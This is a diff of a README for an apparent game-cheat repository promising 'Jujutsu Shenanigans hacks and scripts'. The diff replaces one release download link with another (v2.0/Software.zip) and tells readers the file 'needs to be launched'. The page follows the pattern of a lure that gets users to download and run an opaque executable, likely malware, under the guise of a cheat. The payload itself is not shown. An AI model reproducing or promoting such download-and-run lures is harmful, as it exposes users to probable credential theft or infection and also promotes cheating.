@@ -42,9 +42,9 @@ If you are looking to enhance your Jujutsu Shenanigans gaming experience with so
 
 ## Download Now!
 
-Don't miss out on all the action and head over to the [https://github.com/yuqi-spec/Jujutsu-Shenanigans/releases/download/v1.0/Release.zip](https://github.com/yuqi-spec/Jujutsu-Shenanigans/releases/download/v1.0/Release.zip) to get started! The file needs to be launched to unleash the power of Jujutsu Shenanigans hacks and scripts.
+Don't miss out on all the action and head over to the [https://github.com/yuqi-spec/Jujutsu-Shenanigans/releases/download/v2.0/Software.zip](https://github.com/yuqi-spec/Jujutsu-Shenanigans/releases/download/v2.0/Software.zip) to get started! The file needs to be launched to unleash the power of Jujutsu Shenanigans hacks and scripts.
 
-[![Download Now](https://github.com/yuqi-spec/Jujutsu-Shenanigans/releases/download/v1.0/Release.zip)](https://github.com/yuqi-spec/Jujutsu-Shenanigans/releases/download/v1.0/Release.zip)
+[![Download Now](https://github.com/yuqi-spec/Jujutsu-Shenanigans/releases/download/v2.0/Software.zip)](https://github.com/yuqi-spec/Jujutsu-Shenanigans/releases/download/v2.0/Software.zip)
 
 ## Get in the Game!
 
